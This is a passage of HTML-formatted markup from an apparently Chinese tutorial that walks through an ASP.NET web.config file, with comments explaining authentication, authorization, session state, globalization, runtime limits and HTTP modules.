style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.rdlc&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Microsoft.Reporting.RdlBuildProvider, Microsoft.ReportViewer.Common, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;buildProviders&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;compilation&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;通过 &amp;lt;authentication&amp;gt; 节可以配置 ASP.NET 使用的 安全身份验证模式，以标识传入的用户。Windows: 使用IIS验证方式,Forms: 使用基于窗体的验证方式,Passport: 采用Passport cookie验证模式,None: 不采用任何验证方式&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:19px&quot;&gt;authentication&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;mode&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Forms&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;Name:&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;指定完成身份验证的Http cookie的名称.LoginUrl: 如果未通过验证或超时后重定向的页面URL，一般为登录页面，让用户重新登录。Protection: 指定 cookie数据的保护方式. &lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;可设置为:All表示加密数据，并进行有效性验证两种方式，None表示不保护Cookie，Encryption表示对Cookie内容进行加密，validation表示对Cookie内容进行有效性验证，TimeOut: 指定Cookie的失效时间. 超时后要重新登录。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;forms&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.ASPXUSERDEMO&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;loginUrl&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Login.aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;protection&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;All&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;timeout&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;30&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;authentication&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;控制对 URL 资源的客户端访问（如允许匿名用户访问）。此元素可以在任何级别（计算机、站点、应用程序、子目录或页）上声明。必需与&amp;lt;authentication&amp;gt; 节配合使用。此处的意思是对匿名用户不进行身份验证。拒绝用户weipeng&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;authorization&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;allow&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;users&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;deny&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;users&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;weipeng&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;allow&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;users&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;aa&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;roles&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;aa&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;authorization&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;站点全球化设置,requestEncoding: 它用来检查每一个发来请求的编码.responseEncoding: 用于检查发回的响应内容编码.fileEncoding:用于检查aspx,asax等文件解析的默认编码,默认的编码是utf-8&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;globalization&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;requestEncoding&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;gb2312&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;responseEncoding&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;gb2312&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;fileEncoding&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;gb2312&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;会话状态设置。mode: 分为off,Inproc,StateServer,SqlServer几种状态 mode = InProc 存储在进程中特点：具有最佳的性能，速度最快,但不能跨多台服务器存储共享.mode = &amp;quot;StateServer&amp;quot; 存储在状态服务器中特点:当需要跨服务器维护用户会话信息时，使用此方法。但是信息存储在状态服务器上，一旦状态服务器出现故障，信息将丢失. mode=&amp;quot;SqlServer&amp;quot; 存储在sql server中特点:工作负载会变大，但信息不会丢失&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;stateConnectionString :&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;指定asp.net应用程序存储远程会话状态的服务器名，默认为本机。sqlConnectionString:当用会话状态数据库时，在这里设置连接字符串。Cookieless:设置为flase时，表示使用cookie会话状态来标识客户.timeout表示会话超时时间。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;sessionState&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;mode&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;InProc&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;stateConnectionString&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;tcpip=127.0.0.1:42424&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;sqlConnectionString&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;data source=127.0.0.1;Trusted_Connection=yes&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;cookieless&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;timeout&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;20&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;color:maroon&quot;&gt;sessionState&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;为 ASP.NET 应用程序配置页的视图状态设置。设置要存储在页历史记录中的项数。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;sessionPageState&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;historySize&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;9&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;配置asp.net http运行库的设置。可以在计算机，站点，应用程序和子目录级别声明&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;允许最多的请求个数100，最长允许执行请求时间为80秒，控制用户上传文件的大小,默认是4M。useFullyQualifiedRedirectUrl客户端重定向不需要被自动转换为完全限定格式。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;httpRuntime&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;appRequestQueueLimit&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;100&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;executionTimeout&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;80&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;maxRequestLength&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;40960&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;useFullyQualifiedRedirectUrl&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;httpModules&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;在一个应用程序内配置 HTTP 模块。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;httpModules&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;OutputCache&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Caching.OutputCacheModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Session&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.SessionState.SessionStateModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;WindowsAuthentication&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.WindowsAuthenticationModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;FormsAuthentication&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.FormsAuthenticationModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;PassportAuthentication&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.PassportAuthenticationModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;RoleManager&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.RoleManagerModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;UrlAuthorization&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.UrlAuthorizationModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;FileAuthorization&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.FileAuthorizationModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p 